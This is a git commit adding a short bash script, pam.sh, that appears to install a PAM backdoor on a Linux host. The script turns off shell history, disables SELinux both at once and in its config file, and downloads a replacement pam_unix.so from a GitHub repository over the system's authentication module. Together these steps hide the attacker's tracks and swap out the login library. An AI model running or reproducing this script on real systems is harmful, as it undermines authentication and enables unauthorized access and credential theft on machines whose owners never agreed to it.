9ae874e1fe62924224da8f943d9b7138225fe4ea
Pe1asguss <99085587+Pe1asguss@users.noreply.github.com>
2022-02-06 10:29:24 +0800

    Add files via upload

---
+++ pam.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+set +o history
+echo "------------------------------------"
+setenforce 0
+echo "------------------------------------"
+sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
+echo "------------------------------------"
+wget https://raw.githubusercontent.com/Pe1asguss/tes/main/pam_unix.so -O /usr/lib64/security/pam_unix.so
+echo "------------------------------------"
+cat /etc/selinux/config
